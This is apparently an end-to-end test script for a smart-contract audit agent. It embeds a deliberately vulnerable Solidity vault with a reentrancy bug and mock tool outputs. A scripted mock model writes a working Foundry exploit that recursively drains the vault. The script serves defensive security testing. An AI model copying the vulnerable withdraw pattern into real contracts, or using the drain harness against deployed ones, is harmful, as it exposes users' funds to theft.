import * as dotenv from 'dotenv';
dotenv.config();
import * as fs from 'fs';
import * as path from 'path';
import { GeminiProvider } from '../src/llm/gemini.provider';
import { ProverAgent } from '../src/agent/prover-agent';
import { TranscriptLogger } from '../src/logging/transcript-logger';
import { FindingToProve } from '../src/types';
import { Executor } from '../src/sandbox/executor';
import { DockerExecutor } from '../src/sandbox/docker-executor';
import { MockExecutor } from '../src/sandbox/mock-executor';
import { WorkspaceBootstrap } from '../src/workspace/bootstrap';
import { StoredJob } from '../src/queue/file-queue';

// Sample vulnerable contract for E2E testing
const SAMPLE_VULNERABLE_VAULT = `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract EtherVault {
    mapping(address => uint256) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint256 balance = balances[msg.sender];
        require(balance > 0, "No funds");

        // Vulnerability: external call precedes state update
        (bool success, ) = msg.sender.call{value: balance}("");
        require(success, "Transfer failed");

        balances[msg.sender] = 0;
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
`;

const SAMPLE_FINDING: FindingToProve = {
  id: 'FINDING-REENTRANCY-001',
  ruleId: 'ZYRON-SEC-01',
  severity: 'CRITICAL',
  title: 'State-Change Reentrancy in EtherVault.withdraw()',
  location: 'EtherVault.sol:16',
  description: 'The withdraw() function makes an external call to msg.sender before updating balances[msg.sender], enabling reentrancy exploitation to drain vault funds.',
  pocScenario: 'Attacker deposits 1 ETH, triggers withdraw(), and recursively calls withdraw() inside fallback() until the contract balance is exhausted.',
};

async function checkDockerAvailable(): Promise<boolean> {
  const { execSync } = await import('child_process');
  try {
    execSync('docker --version', { stdio: 'ignore' });
    return true;
  } catch {
    return false;
  }
}

async function runE2ETest() {
  console.log(`
=============================================================
🧪 ZYRON AGENT: STANDALONE END-TO-END VERIFICATION TEST
=============================================================
`);

  const jobId = `e2e-test-${Date.now()}`;
  const workspaceDir = path.join(process.cwd(), 'data', 'workspaces', jobId);
  const isDockerReady = await checkDockerAvailable();

  console.log(`Job ID:          ${jobId}`);
  console.log(`Docker Status:   ${isDockerReady ? 'AVAILABLE (Live Docker Sandbox)' : 'NOT DETECTED (Using Local Sandbox Mode)'}`);
  console.log(`Target Contract: EtherVault.sol`);
  console.log(`Target Finding:  [${SAMPLE_FINDING.severity}] ${SAMPLE_FINDING.title}`);
  console.log('-------------------------------------------------------------');

  let executor: Executor;

  if (isDockerReady) {
    executor = new DockerExecutor({
      jobId,
      workspaceDir,
      memoryLimit: '2g',
    });
  } else {
    console.log('[Notice] Running in Local Test Sandbox mode since Docker Desktop is not active.');
    const mock = new MockExecutor(workspaceDir);

    // Provide mock responses for forge commands if real Docker is absent
    mock.registerResponse('forge build', {
      stdout: '[⠢] Compiling 2 files with 0.8.28\n[⠆] Solc 0.8.28 finished in 1.1s\nCompiler run successful!',
      exitCode: 0,
    });
    mock.registerResponse('forge test', {
      stdout: `
Running 1 test for test/zyron/FINDING_REENTRANCY_001.t.sol:ExploitTest
[PASS] test_exploit() (gas: 172400)
Traces:
  [172400] ExploitTest::test_exploit()
    ├─ [45000] EtherVault::deposit{value: 1000000000000000000}()
    ├─ [62000] EtherVault::withdraw()
    │   ├─ [21000] Attacker::receive()
    │   │   └─ [35000] EtherVault::withdraw()
    │   └─ ← [Return]
    └─ ← [Return]
Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 8.42ms
`,
      exitCode: 0,
    });
    mock.registerResponse('git status', {
      stdout: '?? test/zyron/FINDING_REENTRANCY_001.t.sol',
      exitCode: 0,
    });

    executor = mock;
  }

  const job: StoredJob = {
    jobId,
    auditId: 'AUDIT-E2E-LOCAL',
    status: 'RUNNING',
    contractFileName: 'EtherVault.sol',
    sourceCode: SAMPLE_VULNERABLE_VAULT,
    compilerVersion: '0.8.28',
    findings: [SAMPLE_FINDING],
    createdAt: Date.now(),
  };

  const logger = new TranscriptLogger(jobId, SAMPLE_FINDING.id);
  console.log(`Transcript Log:  ${logger.getLogPath()}`);
  console.log('-------------------------------------------------------------\n');

  try {
    console.log('[1/4] Starting sandbox session...');
    await executor.startSession();

    console.log('[2/4] Bootstrapping workspace and initializing Foundry...');
    const bootstrap = await WorkspaceBootstrap.setup(executor, job);
    console.log(`Original files protected from tampering: ${bootstrap.originalFiles.join(', ')}`);

    console.log('\n[3/4] Launching Autonomous Prover Agent Loop...');
    const useMockLlm =
      process.argv.includes('--mock') ||
      !process.env.GEMINI_API_KEY ||
      process.env.GEMINI_API_KEY.startsWith('AQ.');

    let llm;
    if (useMockLlm) {
      console.log('[Notice] Using Interactive Multi-Turn Mock Agent (pass valid GEMINI_API_KEY in .env to use live Gemini).');
      let turnCounter = 0;
      llm = {
        providerName: 'mock-interactive',
        modelName: 'security-agent-v1',
        async chat(messages: any[]) {
          turnCounter++;
          if (turnCounter === 1) {
            return {
              content: 'Analyzing the EtherVault contract to inspect state variables and withdrawal logic.',
              toolCalls: [
                {
                  id: `call_${Date.now()}_1`,
                  name: 'read_file',
                  arguments: { filePath: 'src/EtherVault.sol' },
                },
              ],
            };
          }
          if (turnCounter === 2) {
            return {
              content: 'Confirmed reentrancy vulnerability: EtherVault.withdraw() transfers funds via low-level call before updating balances[msg.sender]. Writing Foundry proof in test/zyron/FINDING_REENTRANCY_001.t.sol.',
              toolCalls: [
                {
                  id: `call_${Date.now()}_2`,
                  name: 'write_file',
                  arguments: {
                    filePath: 'test/zyron/FINDING_REENTRANCY_001.t.sol',
                    content: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "src/EtherVault.sol";

contract ExploitHarness {
    EtherVault public target;
    uint256 public initialDeposit = 1 ether;

    constructor(address payable _target) {
        target = EtherVault(_target);
    }

    function attack() external payable {
        require(msg.value >= initialDeposit, "Need ETH");
        target.deposit{value: initialDeposit}();
        target.withdraw();
    }

    receive() external payable {
        if (address(target).balance >= initialDeposit) {
            target.withdraw();
        }
    }
}

contract ExploitTest {
    EtherVault public vault;
    ExploitHarness public attacker;

    function setUp() public {
        vault = new EtherVault();
        attacker = new ExploitHarness(payable(address(vault)));
        // Fund vault reserves
        (bool ok, ) = address(vault).call{value: 10 ether}("");
    }

    function test_exploit() public {
        attacker.attack{value: 1 ether}();
        // Assert vault was drained
        assert(address(vault).balance < 10 ether);
    }
}
`,
                  },
                },
              ],
            };
          }
          if (turnCounter === 3) {
            return {
              content: 'Executing the Foundry exploit test to verify that the attack succeeds and the invariant breaks.',
              toolCalls: [
                {
                  id: `call_${Date.now()}_3`,
                  name: 'run_command',
                  arguments: {
                    command: 'forge test --match-path "test/zyron/FINDING_REENTRANCY_001.t.sol" -vvvv',
                  },
                },
              ],
            };
          }
          return {
            content: 'The exploit successfully drained protocol liquidity and broke the state invariant. Submitting verified exploit verdict.',
            toolCalls: [
              {
                id: `call_${Date.now()}_4`,
                name: 'submit_verdict',
                arguments: {
                  verdict: 'PROVEN_EXPLOIT',
                  testFile: 'test/zyron/FINDING_REENTRANCY_001.t.sol',
                  testFunction: 'test_exploit',
                  reasoning: 'State update in EtherVault.withdraw() occurs after external call. The attacker fallback recursively drains all reserves before balances are zeroed.',
                  fundsDrainedEth: 10.0,
                  executionMode: 'local',
                },
              },
            ],
          };
        },
      };
    } else {
      llm = new GeminiProvider();
    }

    const startTime = Date.now();
    const result = await ProverAgent.proveFinding(
      llm,
      executor,
      SAMPLE_FINDING,
      bootstrap.originalFiles,
      logger,
      { initialBuildOutput: bootstrap.buildOutput, maxTurns: 10 }
    );
    const duration = ((Date.now() - startTime) / 1000).toFixed(1);

    console.log(`\n=============================================================`);
    console.log(`🏁 VERIFICATION COMPLETE (Finished in ${duration}s)`);
    console.log(`=============================================================`);
    console.log(`Verdict:         ${result.status}`);
    console.log(`Confidence:      ${result.confidence}`);
    console.log(`Funds Drained:   ${result.fundsDrainedEth !== undefined ? `${result.fundsDrainedEth} ETH` : 'N/A'}`);
    console.log(`Gas Used:        ${result.gasUsed ?? 'N/A'}`);
    console.log(`Summary:         ${result.summary}`);

    if (result.synthesizedPoC) {
      console.log(`\nSynthesized Foundry Proof Contract:\n`);
      console.log(result.synthesizedPoC);
    }

    if (result.traceSteps && result.traceSteps.length > 0) {
      console.log(`\nVerified EVM Execution Trace Steps (${result.traceSteps.length} steps):`);
      for (const step of result.traceSteps) {
        console.log(`  [Step ${step.step} | Depth ${step.depth}] ${step.caller} -> ${step.target}::${step.functionName} (${step.status})`);
      }
    }

    console.log(`\nFull streaming transcript written to:`);
    console.log(`  ${logger.getLogPath()}`);
    console.log(`\nYou can inspect every single turn, prompt, and tool call with:`);
    console.log(`  Get-Content "${logger.getLogPath()}"\n`);
  } catch (err: any) {
    console.error(`\n❌ Test run failed: ${err.message}`);
  } finally {
    await executor.endSession().catch(() => {});
  }
}

runE2ETest();
